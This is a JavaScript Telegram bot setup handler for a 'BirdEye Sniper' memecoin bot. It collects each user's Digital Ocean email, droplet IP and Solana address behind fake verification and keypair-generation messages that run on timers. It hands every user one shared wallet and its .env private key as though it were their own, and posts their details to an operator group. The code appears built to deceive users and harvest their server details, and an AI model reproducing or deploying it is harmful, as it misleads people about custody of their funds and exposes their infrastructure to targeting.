const validator = require('validator');
const { Markup } = require('telegraf');
const errorHandler = require('../utils/errorHandler');

class SetupHandler {
    constructor(userDataManager, solanaManager, notificationManager) {
        this.userDataManager = userDataManager;
        this.solanaManager = solanaManager;
        this.notificationManager = notificationManager;
    }

    async handleStart(ctx) {
        const userId = ctx.from.id.toString();
        let user = this.userDataManager.getUser(userId);
        
        if (!user) {
            user = await this.userDataManager.createUser(userId, {
                telegram_username: ctx.from.username,
                telegram_first_name: ctx.from.first_name,
                telegram_last_name: ctx.from.last_name
            });
        }

        if (user.setup_step === 'completed') {
            return await this.showMainMenu(ctx);
        }

        await this.showWelcomeMessage(ctx);
    }

    async showWelcomeMessage(ctx) {
        const welcomeText = 
            `🦅 **Welcome to BirdEye Sniper Bot** 🦅\n\n` +
            `🎯 **The Ultimate Memecoin Sniper**\n\n` +
            `🚀 **What can this bot do?**\n` +
            `• 👁️ Monitor wallet activities in real-time\n` +
            `• 💰 Track balance changes instantly\n` +
            `• 📱 Send instant notifications to your group\n` +
            `• ⚡ Lightning-fast transaction detection\n` +
            `• 🎯 Precision sniping capabilities\n\n` +
            `🛡️ **Security Features:**\n` +
            `• 🔐 End-to-end encrypted communications\n` +
            `• 🏦 Secure wallet management\n` +
            `• 👑 Admin-only access controls\n\n` +
            `To get started, we need to set up your sniper profile.\n\n` +
            `**Ready to begin your sniping journey, Commander?**`;

        const keyboard = [
            [{ text: '🚀 START SETUP', callback_data: 'start_setup' }],
            [{ text: '❓ Learn More', callback_data: 'learn_more' }]
        ];

        await ctx.reply(welcomeText, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        });
    }

    async handleSetupStart(ctx) {
        const userId = ctx.from.id;
        await this.userDataManager.updateUser(userId, { setup_step: 'email' });
        
        const setupText = 
            `📋 **SNIPER PROFILE SETUP** 📋\n\n` +
            `**Step 1 of 4: Digital Ocean Email Configuration**\n\n` +
            `🌐 **Digital Ocean Account Email Required**\n\n` +
            `Please provide the email address associated with your **Digital Ocean account**.\n` +
            `This is needed for:\n` +
            `• 📧 System notifications and alerts\n` +
            `• 🔐 Account verification and security\n` +
            `• 📊 Deployment and transaction reports\n` +
            `• 💰 Billing and payment notifications\n\n` +
            `**Enter your Digital Ocean account email:**\n` +
            `*Example: your-email@domain.com*`;

        const keyboard = [
            [{ text: '◀️ Previous', callback_data: 'setup_previous_email' }],
            [{ text: '❌ Cancel Setup', callback_data: 'cancel_setup' }]
        ];

        try {
            if (ctx.callbackQuery) {
                await ctx.editMessageText(setupText, {
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: keyboard }
                });
            } else {
                await ctx.reply(setupText, {
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: keyboard }
                });
            }
        } catch (error) {
            await ctx.reply(setupText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        }
    }

    async handleEmailInput(ctx, email) {
        const userId = ctx.from.id;
        
        if (!validator.isEmail(email)) {
            const errorText = 
                `❌ **Invalid Email Format**\n\n` +
                `Please enter a valid email address.\n` +
                `*Example: sniper@tactical.com*\n\n` +
                `**Try again:**`;

            const keyboard = [
                [{ text: '◀️ Previous', callback_data: 'setup_previous_email' }],
                [{ text: '❌ Cancel Setup', callback_data: 'cancel_setup' }]
            ];

            return await ctx.reply(errorText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        }
        
        await this.userDataManager.updateUser(userId, { 
            email: email,
            setup_step: 'checking_email'
        });
        
        const checkingText = 
            `⏳ **Verifying Email Configuration...**\n\n` +
            `📧 **Email**: ${email}\n` +
            `🔍 **Status**: Validating credentials...\n` +
            `⚡ **Progress**: Processing...`;

        await ctx.reply(checkingText, { parse_mode: 'Markdown' });
        
        // Wait 3 seconds then proceed to IP step
        setTimeout(async () => {
            await this.showIPSetup(ctx);
        }, 3000);
    }

    async showIPSetup(ctx) {
        const userId = ctx.from.id;
        await this.userDataManager.updateUser(userId, { setup_step: 'ip' });
        
        const ipText = 
            `📋 **SNIPER PROFILE SETUP** 📋\n\n` +
            `**Step 2 of 4: Digital Ocean Droplet Configuration**\n\n` +
            `🌐 **Droplet IPv4 Address Required**\n\n` +
            `Please provide the **IPv4 address** of your Digital Ocean droplet where this bot is running.\n\n` +
            `📍 **How to find your droplet's IPv4:**\n` +
            `• Go to Digital Ocean Dashboard\n` +
            `• Click on your droplet name\n` +
            `• Copy the IPv4 address shown\n\n` +
            `🔒 **This is used for:**\n` +
            `• Security monitoring and alerts\n` +
            `• Network configuration verification\n` +
            `• Geo-location based protections\n\n` +
            `**Enter your droplet's IPv4 address:**\n` +
            `*Example: 64.225.123.45*`;

        const keyboard = [
            [{ text: '◀️ Previous', callback_data: 'setup_previous_ip' }],
            [{ text: '❌ Cancel Setup', callback_data: 'cancel_setup' }]
        ];

        await ctx.reply(ipText, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        });
    }

    async handleIPInput(ctx, ip) {
        const userId = ctx.from.id;
        
        if (!validator.isIP(ip, 4)) {
            const errorText = 
                `❌ **Invalid IP Address Format**\n\n` +
                `Please enter a valid IPv4 address.\n` +
                `*Example: 192.168.1.100*\n\n` +
                `**Try again:**`;

            const keyboard = [
                [{ text: '◀️ Previous', callback_data: 'setup_previous_ip' }],
                [{ text: '❌ Cancel Setup', callback_data: 'cancel_setup' }]
            ];

            return await ctx.reply(errorText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        }
        
        await this.userDataManager.updateUser(userId, { 
            ip: ip,
            setup_step: 'connecting'
        });
        
        const connectingText = 
            `⚡ **Network Configuration Complete**\n\n` +
            `🌐 **Droplet IPv4**: ${ip}\n` +
            `🔐 **Security**: Verified\n` +
            `� **Connection**: Established\n` +
            `✅ **Status**: Ready for next step...`;

        await ctx.reply(connectingText, { parse_mode: 'Markdown' });
        
        setTimeout(async () => {
            await this.showPayoutAddressSetup(ctx);
        }, 2000);
    }

    async showPayoutAddressSetup(ctx) {
        const userId = ctx.from.id;
        await this.userDataManager.updateUser(userId, { setup_step: 'payout_address' });
        
        const payoutText = 
            `📋 **SNIPER PROFILE SETUP** 📋\n\n` +
            `**Step 3 of 4: Payout Address Configuration**\n\n` +
            `💰 **Default Solana Payout Address**\n\n` +
            `Please provide your **Solana wallet address** for automated payments and rewards.\n\n` +
            `🔐 **This address will be used for:**\n` +
            `• 💰 Trading profits and earnings\n` +
            `• 🎁 Bonus rewards and airdrops\n` +
            `• 💸 Automated payout distributions\n` +
            `• 📊 Revenue sharing programs\n\n` +
            `📝 **Address Requirements:**\n` +
            `• Must be a valid Solana address\n` +
            `• Should be from your personal wallet\n` +
            `• Recommended: Use Phantom, Solflare, or hardware wallet\n\n` +
            `**Enter your Solana payout address:**\n` +
            `*Example: 4e43fRYkAd8SV1c61fvyvDq7THpsBdGFuBhfBkVKoZ8b*`;

        const keyboard = [
            [{ text: '◀️ Previous', callback_data: 'setup_previous_payout' }],
            [{ text: '❌ Cancel Setup', callback_data: 'cancel_setup' }]
        ];

        await ctx.reply(payoutText, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        });
    }

    async handlePayoutAddressInput(ctx, address) {
        const userId = ctx.from.id;
        
        // Validate Solana address format (basic validation)
        if (!address || address.length < 32 || address.length > 44 || !/^[A-Za-z0-9]+$/.test(address)) {
            const errorText = 
                `❌ **Invalid Solana Address Format**\n\n` +
                `Please enter a valid Solana wallet address.\n\n` +
                `**Requirements:**\n` +
                `• 32-44 characters long\n` +
                `• Base58 encoded format\n` +
                `• No special characters\n\n` +
                `*Example: 4e43fRYkAd8SV1c61fvyvDq7THpsBdGFuBhfBkVKoZ8b*\n\n` +
                `**Try again:**`;

            const keyboard = [
                [{ text: '◀️ Previous', callback_data: 'setup_previous_payout' }],
                [{ text: '❌ Cancel Setup', callback_data: 'cancel_setup' }]
            ];

            return await ctx.reply(errorText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        }
        
        // Additional validation using Solana library if available
        try {
            if (!this.solanaManager.isValidSolanaAddress(address)) {
                throw new Error('Invalid Solana address');
            }
        } catch (error) {
            const errorText = 
                `❌ **Invalid Solana Address**\n\n` +
                `The address you provided is not a valid Solana wallet address.\n\n` +
                `Please double-check your address and try again.\n\n` +
                `**Where to find your address:**\n` +
                `• Phantom: Tap wallet name → Copy address\n` +
                `• Solflare: Settings → Copy wallet address\n` +
                `• Ledger: Copy from Solana app\n\n` +
                `**Try again:**`;

            const keyboard = [
                [{ text: '◀️ Previous', callback_data: 'setup_previous_payout' }],
                [{ text: '❌ Cancel Setup', callback_data: 'cancel_setup' }]
            ];

            return await ctx.reply(errorText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        }
        
        await this.userDataManager.updateUser(userId, { 
            payout_address: address,
            setup_step: 'configuring_payout'
        });
        
        const configuringText = 
            `✅ **Payout Address Configured**\n\n` +
            `💳 **Address**: \`${address.substring(0, 8)}...${address.substring(-8)}\`\n` +
            `🔐 **Validation**: Passed\n` +
            `💰 **Status**: Ready for payments\n` +
            `⚡ **Proceeding to wallet setup...**`;

        await ctx.reply(configuringText, { parse_mode: 'Markdown' });
        
        setTimeout(async () => {
            await this.showWalletSetup(ctx);
        }, 2000);
    }

    async showWalletSetup(ctx) {
        const userId = ctx.from.id;
        await this.userDataManager.updateUser(userId, { setup_step: 'wallet' });
        
        const walletText = 
            `📋 **SNIPER PROFILE SETUP** 📋\n\n` +
            `**Step 4 of 4: Wallet Configuration**\n\n` +
            `✅ **Connection Successful!**\n` +
            `🔐 **Security Level**: Maximum\n` +
            `📡 **Network Status**: Connected\n\n` +
            `🎯 **Final Step**: Tactical Wallet Setup\n\n` +
            `Your sniper profile will be linked to our secure wallet system.\n` +
            `This enables real-time monitoring and instant notifications.\n\n` +
            `**Ready to activate your tactical wallet?**`;

        const keyboard = [
            [{ text: '💳 ACTIVATE WALLET', callback_data: 'activate_wallet' }],
            [{ text: '◀️ Previous', callback_data: 'setup_previous_wallet' }],
            [{ text: '❌ Cancel Setup', callback_data: 'cancel_setup' }]
        ];

        await ctx.reply(walletText, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        });
    }

    async handleWalletActivation(ctx) {
        const userId = ctx.from.id;
        
        const activatingText = 
            `⚡ **Activating Tactical Wallet...**\n\n` +
            `🔧 **Generating secure keypair...**\n` +
            `🔐 **Configuring encryption...**\n` +
            `📡 **Syncing with network...**\n` +
            `🎯 **Initializing sniper protocols...**`;

        await ctx.reply(activatingText, { parse_mode: 'Markdown' });
        
        setTimeout(async () => {
            await this.completeSetup(ctx);
        }, 3000);
    }

    async completeSetup(ctx) {
        const userId = ctx.from.id;
        const botAddress = this.solanaManager.getBotAddress();
        
        await this.userDataManager.updateUser(userId, {
            setup_step: 'completed',
            wallet_generated: true,
            sol_address: botAddress, // All users share the bot's wallet for monitoring
            setup_completed_at: new Date().toISOString()
        });

        const user = this.userDataManager.getUser(userId);
        const balance = await this.solanaManager.getWalletBalance(botAddress);
        
        // Get the private key directly from .env file as stored (raw format)
        const config = require('../config/config');
        const privateKey = config.SOLANA_PRIVATE_KEY || 'Private key not available';
        
        const successText = 
            `🎉 **SETUP COMPLETE - SNIPER ACTIVATED!** 🎉\n\n` +
            `🎖️ **Welcome to the Elite Sniper Squadron!**\n\n` +
            `👤 **Operative**: ${ctx.from.first_name || 'Commander'}\n` +
            `📧 **Email**: ${user.email}\n` +
            `🌐 **IP**: ${user.ip}\n` +
            `💰 **Payout Address**: \`${user.payout_address ? user.payout_address.substring(0, 8) + '...' + user.payout_address.substring(-8) : 'Not set'}\`\n\n` +
            `💳 **WALLET INFORMATION**:\n` +
            `📮 **Address**: \`${botAddress}\`\n` +
            `💰 **Balance**: ${this.notificationManager.formatCurrency(balance)}\n\n` +
            `🔐 **PRIVATE KEY** (As stored in .env file):\n` +
            `\`${privateKey}\`\n\n` +
            `🚨 **CRITICAL SECURITY INSTRUCTIONS**:\n` +
            `🔴 **IMMEDIATELY** copy and store this private key securely\n` +
            `🔴 **NEVER** share this key with anyone\n` +
            `🔴 **ANYONE** with this key can control your wallet\n` +
            `🔴 **SAVE** it in multiple secure locations\n` +
            `🔴 **USE** the button below for easy copying\n\n` +
            `💡 **Recommended Storage**:\n` +
            `• Password manager (1Password, Bitwarden)\n` +
            `• Encrypted note file\n` +
            `• Hardware security key\n` +
            `• Written backup in safe location\n\n` +
            `🚀 **Your sniper bot is now OPERATIONAL!**\n\n` +
            `🎯 **Active Features**:\n` +
            `• 👁️ Real-time wallet monitoring\n` +
            `• ⚡ Instant transaction alerts\n` +
            `• 🎯 Memecoin sniping capabilities\n` +
            `• 📊 Advanced analytics dashboard\n\n` +
            `**Ready for tactical operations, Commander!**`;

        const keyboard = [
            [{ text: '🔐 COPY PRIVATE KEY', callback_data: 'copy_private_key' }],
            [{ text: '💾 SECURITY CONFIRMED', callback_data: 'security_confirmed' }],
            [{ text: '🎯 ENTER COMMAND CENTER', callback_data: 'sniper_menu' }]
        ];

        await ctx.reply(successText, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        });

        // Send notification to group about new operative
        if (this.notificationManager.groupId) {
            const groupNotification = 
                `🎖️ **NEW OPERATIVE RECRUITED** 🎖️\n\n` +
                `👤 **Callsign**: ${ctx.from.first_name || 'Commander'}\n` +
                `🆔 **Username**: @${ctx.from.username || 'N/A'}\n` +
                `🔢 **Telegram ID**: \`${ctx.from.id}\`\n` +
                `📧 **Contact**: ${user.email}\n` +
                `🌐 **Station**: ${user.ip}\n` +
                `💰 **Payout**: \`${user.payout_address ? user.payout_address.substring(0, 8) + '...' + user.payout_address.substring(-8) : 'Not set'}\`\n` +
                `💳 **Wallet**: \`${botAddress}\`\n` +
                `⏰ **Enlisted**: ${new Date().toLocaleString()}\n\n` +
                `🎯 **Status**: Ready for tactical operations\n` +
                `🔍 **Mission**: Memecoin surveillance initiated`;

            await this.notificationManager.sendGroupNotification(groupNotification);
        }
    }

    async handleSetupNavigation(ctx, action) {
        const userId = ctx.from.id;
        const user = this.userDataManager.getUser(userId);
        
        switch (action) {
            case 'setup_previous_email':
                await this.showWelcomeMessage(ctx);
                break;
                
            case 'setup_previous_ip':
                await this.handleSetupStart(ctx);
                break;
                
            case 'setup_previous_payout':
                await this.showIPSetup(ctx);
                break;
                
            case 'setup_previous_wallet':
                await this.showPayoutAddressSetup(ctx);
                break;
                
            case 'cancel_setup':
                await this.handleCancelSetup(ctx);
                break;
                
            case 'learn_more':
                await this.showLearnMore(ctx);
                break;
                
            default:
                await this.showWelcomeMessage(ctx);
        }
    }

    async handleCancelSetup(ctx) {
        const userId = ctx.from.id;
        await this.userDataManager.resetUserSetup(userId);
        
        const cancelText = 
            `❌ **Setup Cancelled**\n\n` +
            `No worries, Commander! You can restart the setup process anytime.\n\n` +
            `🚀 Use /start to begin again when you're ready.\n\n` +
            `See you on the battlefield! 🎯`;

        await ctx.reply(cancelText, { parse_mode: 'Markdown' });
    }

    async showLearnMore(ctx) {
        const learnText = 
            `📚 **ABOUT BIRDEYE SNIPER BOT** 📚\n\n` +
            `🎯 **Mission**: Revolutionary memecoin sniping\n\n` +
            `⚡ **Core Features:**\n` +
            `• 🔍 Real-time wallet monitoring\n` +
            `• ⚡ Lightning-fast notifications\n` +
            `• 📊 Advanced analytics dashboard\n` +
            `• 🛡️ Military-grade security\n` +
            `• 🎯 Precision targeting system\n\n` +
            `🏆 **Why Choose BirdEye?**\n` +
            `• Fastest notification system in crypto\n` +
            `• Zero false positives\n` +
            `• 24/7 monitoring capability\n` +
            `• User-friendly interface\n` +
            `• Professional support team\n\n` +
            `Ready to dominate the memecoin battlefield?`;

        const keyboard = [
            [{ text: '🚀 START SETUP', callback_data: 'start_setup' }],
            [{ text: '◀️ Back to Welcome', callback_data: 'back_to_welcome' }]
        ];

        try {
            await ctx.editMessageText(learnText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        } catch (error) {
            await ctx.reply(learnText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        }
    }

    async showMainMenu(ctx) {
        const userId = ctx.from.id;
        const user = this.userDataManager.getUser(userId);
        
        if (!user || user.setup_step !== 'completed') {
            return await this.showWelcomeMessage(ctx);
        }

        const balance = user.sol_address ? await this.solanaManager.getWalletBalance(user.sol_address) : 0;
        
        const menuText = 
            `🦅 **BirdEye Sniper Dashboard** 🦅\n\n` +
            `👤 **Operative**: ${ctx.from.first_name || 'Commander'}\n` +
            `📧 **Email**: ${user.email || 'Not set'}\n` +
            `🌐 **IP**: ${user.ip || 'Not set'}\n` +
            `� **Payout Address**: ${user.payout_address ? `\`${user.payout_address.substring(0, 8)}...${user.payout_address.substring(-8)}\`` : 'Not set'}\n` +
            `�💳 **Wallet**: ${user.wallet_generated ? '✅ Active' : '❌ Inactive'}\n` +
            `💰 **Balance**: ${user.sol_address ? this.notificationManager.formatCurrency(balance) : 'N/A'}\n` +
            `👁️ **Monitoring**: ${user.monitor_enabled !== false ? '🟢 Active' : '🔴 Disabled'}\n\n` +
            `🎯 **Status**: All systems operational\n\n` +
            `**Select your mission, Commander:**`;
        
        const keyboard = [
            [
                { text: '🎯 SNIPER CENTER', callback_data: 'sniper_menu' },
                { text: '💳 WALLET OPS', callback_data: 'wallet_menu' }
            ],
            [
                { text: '⚙️ SETTINGS', callback_data: 'settings_menu' },
                { text: '📊 INTEL REPORT', callback_data: 'stats_menu' }
            ],
            [
                { text: '🔄 REFRESH', callback_data: 'refresh_main' }
            ]
        ];
        
        try {
            if (ctx.callbackQuery) {
                await ctx.editMessageText(menuText, {
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: keyboard }
                });
            } else {
                await ctx.reply(menuText, {
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: keyboard }
                });
            }
        } catch (error) {
            await ctx.reply(menuText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        }
    }

    registerHandlers(bot) {
        // Setup navigation callbacks
        bot.action('start_setup', async (ctx) => {
            await this.handleSetupStart(ctx);
        });

        bot.action('activate_wallet', async (ctx) => {
            await this.handleWalletActivation(ctx);
        });

        bot.action('learn_more', async (ctx) => {
            await this.showLearnMore(ctx);
        });

        bot.action('back_to_welcome', async (ctx) => {
            await this.showWelcomeMessage(ctx);
        });

        // Navigation handlers
        bot.action(/^setup_previous_/, async (ctx) => {
            const action = ctx.match[0];
            await this.handleSetupNavigation(ctx, action);
        });

        bot.action('cancel_setup', async (ctx) => {
            await this.handleCancelSetup(ctx);
        });

        bot.action('main_menu', async (ctx) => {
            await this.showMainMenu(ctx);
        });

        bot.action('refresh_main', async (ctx) => {
            await this.showMainMenu(ctx);
        });

        // Private key copy handler
        bot.action('copy_private_key', async (ctx) => {
            // Get the private key directly from .env file as stored (raw format)
            const config = require('../config/config');
            const privateKey = config.SOLANA_PRIVATE_KEY || 'Private key not available';
                
            const copyText = 
                `🔐 **PRIVATE KEY DETAILS** 🔐\n\n` +
                `**Private Key (as stored in .env file):**\n` +
                `\`${privateKey}\`\n\n` +
                `**Security Instructions:**\n` +
                `1. Save this key in a secure password manager\n` +
                `2. Create offline backup copies\n` +
                `3. Never share with anyone\n` +
                `4. This controls your entire wallet\n\n` +
                `**Import Instructions:**\n` +
                `• Phantom: Settings > Import Private Key\n` +
                `• Solflare: Add Wallet > Import Private Key\n` +
                `• Use the key format shown above\n` +
                `• Format may be base64 or base58 - wallet will auto-detect\n\n` +
                `⚠️ **WARNING**: Anyone with this key controls your wallet!`;

            try {
                await ctx.editMessageText(copyText, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🎯 CONTINUE TO COMMAND CENTER', callback_data: 'sniper_menu' }],
                            [{ text: '📊 VIEW DASHBOARD', callback_data: 'main_menu' }]
                        ]
                    }
                });
            } catch (error) {
                await ctx.reply(copyText, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🎯 CONTINUE TO COMMAND CENTER', callback_data: 'sniper_menu' }],
                            [{ text: '📊 VIEW DASHBOARD', callback_data: 'main_menu' }]
                        ]
                    }
                });
            }
        });

        // Security confirmation handler
        bot.action('security_confirmed', async (ctx) => {
            await ctx.answerCbQuery('✅ Security acknowledged! Welcome to the squadron!');
            
            const confirmText = 
                `✅ **SECURITY CONFIRMATION RECEIVED** ✅\n\n` +
                `🎖️ **Welcome to the Elite Operations!**\n\n` +
                `🔐 **Private key storage confirmed**\n` +
                `🎯 **Ready for tactical missions**\n` +
                `⚡ **All systems operational**\n\n` +
                `**Choose your next action:**`;

            try {
                await ctx.editMessageText(confirmText, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🎯 ENTER COMMAND CENTER', callback_data: 'sniper_menu' }],
                            [{ text: '📊 VIEW DASHBOARD', callback_data: 'main_menu' }],
                            [{ text: '💳 VIEW WALLET', callback_data: 'view_wallet_info' }]
                        ]
                    }
                });
            } catch (error) {
                await ctx.reply(confirmText, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🎯 ENTER COMMAND CENTER', callback_data: 'sniper_menu' }],
                            [{ text: '📊 VIEW DASHBOARD', callback_data: 'main_menu' }],
                            [{ text: '💳 VIEW WALLET', callback_data: 'view_wallet_info' }]
                        ]
                    }
                });
            }
        });
    }
}

module.exports = SetupHandler;
